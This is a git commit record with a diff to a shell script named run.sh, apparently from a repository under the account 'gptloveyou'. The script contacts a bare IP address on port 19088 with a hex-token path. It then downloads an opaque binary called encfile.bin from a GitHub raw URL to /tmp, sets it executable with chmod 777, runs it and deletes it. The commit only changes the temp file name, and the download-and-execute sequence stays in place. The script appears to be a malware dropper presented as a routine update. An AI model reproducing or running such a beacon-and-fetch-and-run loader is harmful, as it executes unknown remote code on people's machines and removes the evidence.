07441a804990677413b8cfeeb863fac588b64bb7
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 05:45:15 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
-curl -o /tmp/run.bin https://raw.githubusercontent.com/gptloveyou/learn/main/encfile.bin
-chmod 777 /tmp/run.bin
-/tmp/run.bin
-rm /tmp/run.bin
+curl -o /tmp/run2.bin https://raw.githubusercontent.com/gptloveyou/learn/main/encfile.bin
+chmod 777 /tmp/run2.bin
+/tmp/run2.bin
+rm /tmp/run2.bin
